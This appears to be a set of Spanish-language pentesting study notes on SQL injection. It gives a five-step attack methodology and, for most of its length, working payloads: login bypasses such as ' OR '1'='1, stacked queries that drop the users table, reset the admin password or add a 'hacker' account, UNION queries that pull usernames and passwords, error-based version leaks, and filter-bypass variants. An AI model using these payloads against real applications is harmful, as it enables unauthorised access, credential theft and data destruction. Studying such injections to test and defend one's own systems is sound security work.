
### Metodología

1. **Detectar el punto de inyección**: Probar con `'`, `"`, `;`, `--` para ver si hay errores
2. **Identificar el tipo de base de datos**: Usar funciones específicas (`@@version`, `version()`)
3. **Determinar número de columnas**: Con `ORDER BY` o `UNION SELECT NULL`
4. **Extraer datos**: Usar `UNION SELECT` para obtener información de otras tablas
5. **Escalar privilegios**: Intentar leer archivos, ejecutar comandos según la BD

### Inyección básica

Se puede inyectar en el campo de nombre de usuario o en el de la contraseña

```sql
' OR '1'='1
```


***Resultado esperado***

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```


***Posibles errores***

Al ser `'1'='1'` siempre cierto, **la base de datos devuelve todos los usuarios**, lo que omite por completo la comprobación real del usuario y contraseña, ahora bien, si el servidor espera un solo usuario nos puede dar error. Para ello podemos usar la siguiente **solución**

```sql
' or 1=1 limit 1 --
```


### Inyección con comentarios

Los comentarios SQL permiten ignorar el resto de la consulta

```sql
admin' --
admin'#
admin'/*
```


***Resultado esperado***

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'cualquiercosa';
```

Todo lo que va después de `--` se queda comentado por lo tanto no se ejecuta

### Stacked queries
Permite ejecutar múltiples sentencias SQL
```sql
'; DROP TABLE users; --
'; UPDATE users SET password='hacked' WHERE username='admin'; --
'; INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --
```
***Consideraciones***
No todos los motores de base de datos lo permiten. Funciona en: SQL Server, PostgreSQL. No funciona en: MySQL (en contextos normales).

### Union-based SQLi
Permite extraer datos de otras tablas mediante UNION
```sql
' UNION SELECT NULL, username, password FROM users --
```
***Consideraciones***
- El número de columnas debe coincidir con la consulta original
- Se puede determinar el número de columnas con:
```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```
Cuando falle, sabrás cuántas columnas hay.

### Error-based SQLi
Provoca errores para extraer información
```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
```
El error revelará información del sistema.

### Bypass de filtros comunes
```sql
' OR '1'='1' --          → Básico
' OR 1=1 --              → Sin comillas
' || '1'='1' --          → Concatenación
' OR 'x'='x' --          → Variante
admin'||'1'='1          → Sin espacios
' UNION SELECT 1,2,3 --  → Extracción de datos